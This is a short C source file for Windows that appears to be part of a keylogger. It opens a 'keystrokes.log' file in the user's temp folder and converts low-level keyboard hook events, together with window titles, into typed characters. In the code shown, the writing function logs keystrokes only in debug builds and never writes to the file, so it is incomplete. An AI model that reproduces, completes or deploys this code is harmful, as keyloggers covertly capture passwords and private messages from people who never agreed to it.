#include "windows.h"
#include "stdafx.h"
#include "logger.h"

#define OUTPUT_FILE_NAME "keystrokes.log"

CHAR *pathToOutputFile;
FILE *outputFile;
BYTE keyboardState[256];
WCHAR unicodeBuffer[16];

void InitWritter() {
	CHAR tempPath[MAX_PATH] = { 0 };
	GetTempPathA(MAX_PATH, tempPath); // retrieving temp path
	pathToOutputFile = (char *)malloc(sizeof(OUTPUT_FILE_NAME) + sizeof(tempPath) + 1);
	strcpy(pathToOutputFile, tempPath);
	strcat(pathToOutputFile, OUTPUT_FILE_NAME);
#ifdef _DEBUG
	LogMessage("Path: %s", pathToOutputFile);
#endif // DEBUG
	outputFile = fopen(pathToOutputFile, "a+");
}

void WriteKeyboardEvent(TCHAR *lastTitle, TCHAR *title, PKBDLLHOOKSTRUCT keyEvent) {
	GetKeyboardState(keyboardState);
	ToUnicode(keyEvent->vkCode, keyEvent->scanCode, keyboardState, (LPWSTR)&unicodeBuffer, sizeof(unicodeBuffer) / 2, 0);
#ifdef _DEBUG
	LogMessage("[%s]: %c (%d)\n", lastTitle, unicodeBuffer[0], keyEvent->vkCode);
#endif // DEBUG
}
